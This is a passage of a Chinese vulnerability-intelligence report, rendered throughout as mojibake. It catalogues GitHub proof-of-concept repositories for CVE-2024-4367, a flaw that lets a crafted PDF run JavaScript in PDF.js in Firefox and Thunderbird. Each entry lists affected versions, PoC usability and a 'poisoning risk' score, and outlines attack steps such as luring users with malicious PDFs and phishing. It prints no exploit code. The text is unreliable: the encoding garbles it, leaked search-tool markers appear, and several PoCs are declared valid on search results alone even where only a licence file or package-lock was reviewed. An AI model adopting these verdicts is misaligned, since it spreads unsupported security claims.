æä¾›çš„POCä»£ç åˆ©ç”¨äº†è¯¥æ¼æ´ã€‚`CVE-2024-4367.py`è„šæœ¬èƒ½å¤Ÿç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ï¼Œè¿™æ®µä»£ç è¢«åµŒå…¥åˆ°PDFçš„å­—ä½“å®šä¹‰ä¸­ã€‚æœç´¢ç»“æœä¸­`exfil0/WEAPONIZING-CVE-2024-4367`ä¹Ÿå°è¯äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„ä»£ç ï¼Œ`CVE-2024-4367.py`è„šæœ¬çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«ç”¨æˆ·æŒ‡å®špayloadçš„PDFæ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ¶æ„ä»£ç æˆ–åé—¨ã€‚`win_calc.pdf`æ–‡ä»¶ç›´æ¥åŒ…å«æ‰§è¡Œ`calc`ç¨‹åºçš„ JavaScript ä»£ç ï¼ŒåŠŸèƒ½æ˜ç¡®ã€‚`xss.pdf` æ–‡ä»¶å†…å®¹ä¸å®Œæ•´ï¼Œæ— æ³•åˆ†æã€‚å› æ­¤ï¼Œè¯¥ä»“åº“çš„æŠ•æ¯’é£é™©è¾ƒä½ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨`CVE-2024-4367.py`è„šæœ¬ï¼Œé€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„JavaScriptä»£ç ï¼Œç”Ÿæˆæ¶æ„çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼Œä¾‹å¦‚é€šè¿‡ç”µå­é‚®ä»¶ã€ç½‘ç«™ç­‰æ–¹å¼ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsè§£æå™¨ä¼šæ‰§è¡ŒPDFæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
4.  è¯¥JavaScriptä»£ç å¯ä»¥æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·ä¿¡æ¯ã€å®‰è£…æ¶æ„è½¯ä»¶ç­‰ã€‚

æ€»ä¹‹ï¼Œæ­¤æ¼æ´çš„CVSSè¯„åˆ†ä¸ºMediumï¼ˆ5.6ï¼‰ï¼Œä½†æ˜¯é€šè¿‡ä¿®æ”¹NVDæ•°æ®å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æ¼æ´å¯èƒ½é€ æˆçš„å±å®³ç¨‹åº¦æ˜¯å¾ˆé«˜çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„PDFæ–‡ä»¶ï¼Œè¯±éª—ç”¨æˆ·æ‰“å¼€ï¼Œä»è€Œæ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯¼è‡´ä¸¥é‡çš„åæœã€‚æä¾›çš„PoCçš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä¸”å½“å‰ä»£ç æœªå‘ç°å­˜åœ¨æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [VVeakee/CVE-2024-4367](https://github.com/VVeakee/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #12

**æ¥æº**: [CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md](../2024/CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md)

## CVE-2024-4367-Mozilla-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²å’Œæ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxï¼ŒFirefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡æ¡£ï¼Œå½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxï¼ŒFirefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç»•è¿‡ PDF.js å¯¹å­—ä½“çš„ç±»å‹æ£€æŸ¥ï¼Œä»è€Œå…è®¸æ‰§è¡Œæœªç»æˆæƒçš„ JavaScript ä»£ç ã€‚æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œè¯¥æ¼æ´çš„ä¸¥é‡æ€§åœ¨äºå¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œå¯èƒ½çªƒå–ç”¨æˆ·å‡­æ®ã€å®‰è£…æ¶æ„è½¯ä»¶æˆ–è€…æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ä»…åŒ…å«GNUé€šç”¨å…¬å…±è®¸å¯è¯å£°æ˜ï¼Œå¹¶ä¸èƒ½åˆ¤æ–­æ¼æ´æœ‰æ•ˆæ€§ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ¼æ´ä»£ç æ‰èƒ½éªŒè¯ï¼Œä½†æ˜¯æ ¹æ®githubæœç´¢ç»“æœ [webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367 ï¼Œè¯æ˜POCæœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ç‰‡æ®µåªåŒ…å«äº†GNUé€šç”¨å…¬å…±è®¸å¯è¯çš„æ–‡æœ¬å†…å®¹ï¼Œå±äºå¼€æºåè®®çš„å£°æ˜ï¼Œ**ä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œçš„ä»£ç æˆ–è€…é…ç½®æ–‡ä»¶**ï¼Œå› æ­¤æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œåˆ¤æ–­æŠ•æ¯’é£é™©ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [Zombie-Kaiser/cve-2024-4367-PoC-fixed](https://github.com/Zombie-Kaiser/cve-2024-4367-PoC-fixed)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #13

**æ¥æº**: [CVE-2024-4367-avalahEE_pdfjs_disable_eval.md](../2024/CVE-2024-4367-avalahEE_pdfjs_disable_eval.md)

## CVE-2024-4367-Firefox-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Firefox, Firefox ESR å’Œ Thunderbird æµè§ˆå™¨ä¸­çš„ PDF.js ç»„ä»¶çš„æ¼æ´ã€‚è¯¥æ¼æ´ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯èƒ½èƒ½å¤Ÿçªƒå–ä¿¡æ¯ã€æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å®Œå…¨æ§åˆ¶å—å®³è€…çš„æµè§ˆå™¨ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢ç»“æœï¼Œæ­¤æ¼æ´å½±å“ç‰¹å®šç‰ˆæœ¬çš„Firefox, Firefox ESRå’ŒThunderbirdï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶æ¥è§¦å‘æ¼æ´ã€‚æ¼æ´åº“ä¿¡æ¯è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªè¾ƒä¸ºä¸¥é‡çš„é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æä¾›çš„ä»£ç å®é™…ä¸Šæ˜¯ä¸€ä¸ªé’ˆå¯¹Odoo 14.0çš„ä¿®å¤æ–¹æ¡ˆï¼Œç”¨äºç¦ç”¨PDF.jsä¸­çš„JavaScriptæ‰§è¡Œï¼Œä»¥è§„é¿CVE-2024-4367çš„å½±å“ã€‚è™½ç„¶ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œä½†éœ€è¦è°¨æ…è¯„ä¼°ã€‚ è¿™ä¸ªè¡¥ä¸é€šè¿‡æ›¿æ¢å’Œä¿®æ”¹ PDF.js ç›¸å…³çš„æ–‡ä»¶ï¼Œè¯•å›¾ç¦ç”¨ JavaScript æ‰§è¡Œã€‚ å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå¦‚æœè¯¥æ¨¡å—æœ¬èº«è¢«æ¶æ„ä¿®æ”¹ï¼Œåˆ™å¯èƒ½å¼•å…¥å…¶ä»–æ¼æ´æˆ–åé—¨ã€‚ ä¾‹å¦‚ï¼Œ`pdfjs_disable_eval/static/src/viewer.html`æ–‡ä»¶æ›¿æ¢äº†åŸæœ‰çš„viewer.htmlï¼Œå¦‚æœæ–°çš„viewer.htmlä¸­åŒ…å«æ¶æ„ä»£ç ï¼Œå°±å¯èƒ½é€ æˆå±å®³ã€‚ æ€»ä½“æ¥è¯´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
2.  å—å®³è€…ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ”»å‡»è€…åˆ©ç”¨æ‰§è¡Œçš„ JavaScript ä»£ç è¿›è¡Œæ¶æ„æ´»åŠ¨ï¼Œä¾‹å¦‚ä¿¡æ¯çªƒå–æˆ–è¿œç¨‹æ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [avalahEE/pdfjs_disable_eval](https://github.com/avalahEE/pdfjs_disable_eval)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #14

**æ¥æº**: [CVE-2024-4367-clarkio_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-clarkio_pdfjs-vuln-demo.md)

## CVE-2024-4367-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨æ­¤æ¼æ´åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆå¦‚æœPDF.jsåœ¨Webç¯å¢ƒä¸­è¿è¡Œï¼‰æˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®Œå…¨æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºï¼ˆå¦‚Firefoxã€Thunderbirdï¼‰ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ˜¯ä¸€ä¸ªæ¼”ç¤ºé¡¹ç›®ï¼Œæ—¨åœ¨å±•ç¤ºå¦‚ä½•åˆ©ç”¨CVE-2024-4367æ¼æ´ã€‚å®ƒåŒ…å«Reactã€Vueå’ŒSvelteçš„å‰ç«¯ç»„ä»¶ï¼Œç”¨äºåŠ è½½å’Œæ˜¾ç¤ºPDFæ–‡ä»¶ã€‚README.mdæ–‡ä»¶æŒ‡ç¤ºå¦‚ä½•è¿è¡Œè¯¥é¡¹ç›®ä»¥åŠå¦‚ä½•æµ‹è¯•ä¸åŒçš„PDFæ–‡ä»¶ï¼ŒåŒ…æ‹¬åˆ©ç”¨è¯¥æ¼æ´çš„PDFæ–‡ä»¶ã€‚æ ¹æ®æè¿°ï¼Œé€šè¿‡ä¿®æ”¹ç»„ä»¶ä¸­å¼•ç”¨çš„PDFæ–‡ä»¶ï¼Œå¯ä»¥å°†ä¸€ä¸ªåˆ©ç”¨æ¼æ´çš„PDFåŠ è½½åˆ°è¿™äº›ç»„ä»¶ä¸­è¿›è¡Œæµ‹è¯•ã€‚æœç´¢å¼•æ“ç»“æœä¸­â€œ[webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367â€ è¡¨æ˜æ¼æ´åˆ©ç”¨ä»£ç å·²å…¬å¼€ã€‚ ç»¼ä¸Šï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå…¶ä¸­åŒ…å«package-lock.jsonç­‰æ–‡ä»¶ã€‚è™½ç„¶æ²¡æœ‰å‘ç°ç«‹å³å¯ä»¥åˆ¤æ–­ä¸ºæŠ•æ¯’çš„æ¶æ„ä»£ç ï¼Œä½†è€ƒè™‘åˆ°npmåŒ…ä¾›åº”é“¾çš„é£é™©ï¼Œä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…åœ¨ä¾èµ–é¡¹ä¸­å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯åˆ›å»ºä¸€ä¸ªæ¼”ç¤ºç¯å¢ƒæ¥å±•ç¤ºæ¼æ´ï¼Œå› æ­¤å¤§éƒ¨åˆ†ä»£ç éƒ½æ˜¯æ­£å¸¸çš„æ¡†æ¶ä»£ç ã€‚ä¸è¿‡ï¼Œ**ä¸èƒ½å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½ï¼Œé£é™©ä¼°è®¡ä¸º10%**ã€‚ ä»£ç ä¸­å­˜åœ¨å¼•ç”¨å¤–éƒ¨npmåŒ…çš„å¯èƒ½æ€§ã€‚æ½œåœ¨é£é™©ç‚¹åŒ…æ‹¬ï¼šä¾èµ–åŒ…æœ¬èº«æ˜¯å¦å®‰å…¨ï¼Œæ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼›æ„å»ºæµç¨‹ä¸­æ˜¯å¦å­˜åœ¨è¢«ç¯¡æ”¹çš„é£é™©ï¼›ä»¥åŠå¼€å‘è€…æ˜¯å¦æ•…æ„éšè—äº†æ¶æ„åŠŸèƒ½ã€‚ ä»”ç»†å®¡æŸ¥ `package-lock.json` æ–‡ä»¶ä¸­çš„ä¾èµ–é¡¹åŠå…¶æ¥æºï¼ŒéªŒè¯ä¾èµ–åŒ…çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ï¼Œå¯ä»¥é™ä½æŠ•æ¯’é£é™©ã€‚ ç”±äºä»…ä»…æ˜¯demoä»£ç ï¼Œä¸”ä¾èµ–çš„åŒ…æ¯”è¾ƒå¤šï¼Œå› æ­¤è¿™é‡Œä¸èƒ½æ˜ç¡®è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  **æ¼æ´è§¦å‘ç‚¹ï¼š** PDF.jsåœ¨å¤„ç†PDFæ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ­¥éª¤ï¼š**
    *   æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç²¾å¿ƒè®¾è®¡çš„å­—ä½“æ•°æ®ã€‚
    *   å½“PDF.jsè§£æè¯¥PDFæ–‡ä»¶å¹¶å¤„ç†å­—ä½“æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä¼šè§¦å‘æ¼æ´ã€‚
    *   æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„å­—ä½“æ•°æ®ï¼Œå¯ä»¥åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
3.  **æ”»å‡»æ•ˆæœï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–è€…åœ¨ç‰¹å®šæƒ…å†µä¸‹å®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [clarkio/pdfjs-vuln-demo](https://github.com/clarkio/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #15

**æ¥æº**: [CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md](../2024/CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶æˆ–è®¿é—®åŒ…å«æ¶æ„PDFçš„ç½‘é¡µã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“çš„ä¸€ä¸ªæ¼æ´ã€‚ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´ä¿¡æ¯ï¼Œæœç´¢å¼•æ“ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼ˆè™½ç„¶åªæä¾›äº† package-lock.json æ–‡ä»¶ï¼Œä½†githubé¡µé¢å·²ç»è¯æ˜æ¼æ´çš„å­˜åœ¨ï¼‰ï¼Œå¯ä»¥ç¡®å®šæä¾›çš„POCä»£ç æœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©:**
æä¾›çš„ `package-lock.json` æ–‡ä»¶å±äºä¸€ä¸ª Node.js é¡¹ç›®ã€‚ä»è¿™ä¸ªæ–‡ä»¶æœ¬èº«æ— æ³•ç›´æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŠ•æ¯’ã€‚ä½†æ˜¯ç”±äºgithubä¸Šå·²ç»æœ‰æ”»å‡»è€…æ„å»ºäº†å¯åˆ©ç”¨çš„pdfæ–‡ä»¶ï¼Œè¯´æ˜åˆ©ç”¨ç®€å•, å› æ­¤å¯ä»¥åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç æ¦‚ç‡æ¯”è¾ƒä½,çº¦10%ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  **æ”»å‡»è€…åˆ¶ä½œæ¶æ„ PDF æ–‡ä»¶ï¼š** è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº† PDF.js å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ã€‚
2.  **ç”¨æˆ·æ‰“å¼€æ¶æ„ PDF æ–‡ä»¶ï¼š**  ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  **æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼š** ç”±äºç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼ŒPDF.js å…è®¸åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [elamani-drawing/CVE-2024-4367-POC-PDFJS](https://github.com/elamani-drawing/CVE-2024-4367-POC-PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #16

**æ¥æº**: [CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md](../2024/CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€XSSæˆ–RCE

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªä¸¥é‡æ¼æ´ï¼Œç”±äºå¯¹PDFæ–‡ä»¶ä¸­FontMatrixå¯¹è±¡çš„ç±»å‹æ£€æŸ¥ä¸è¶³ï¼Œå…è®¸æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ï¼Œåœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡ŒJavaScriptï¼Œä»è€Œå¯¼è‡´æ•°æ®ç›—çªƒã€XSSæˆ–è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸åœ¨PDF.jsç¯å¢ƒä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå½±å“Firefoxã€Firefox ESRå’ŒThunderbirdçš„ç‰¹å®šç‰ˆæœ¬ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md) æè¿°äº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ã€‚è¯¥ä»£ç æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„åˆ©ç”¨æµç¨‹ï¼ŒåŒ…æ‹¬ç¯å¢ƒè®¾ç½®ã€æ¼æ´åˆ©ç”¨ã€ç¤¾å·¥å’Œåå¤„ç†ã€‚ç»¼åˆæ¥çœ‹ï¼Œæä¾›çš„POCä»£ç **æœ‰æ•ˆ**ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è™½ç„¶README.mdæ–‡ä»¶æœ¬èº«çœ‹èµ·æ¥åƒä¸€ä¸ªåˆæ³•çš„æ¼æ´åˆ©ç”¨æŒ‡å—ï¼Œä½†ä»”ç»†åˆ†æè„šæœ¬æè¿°å’Œæ“ä½œæ­¥éª¤ï¼Œå‘ç°å…¶ä¾èµ–äºSocial Engineering Toolkit (SET)æ¥å‘èµ·é’“é±¼æ”»å‡»ï¼Œå¹¶ä¸”åŒ…å«æ‰§è¡Œä»»æ„jsçš„payload, å­˜åœ¨ä¸€å®šçš„**æŠ•æ¯’é£é™©**ã€‚Payloadå¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·å‡­æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚è¯¥POCä»£ç ä¸­ï¼Œé£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

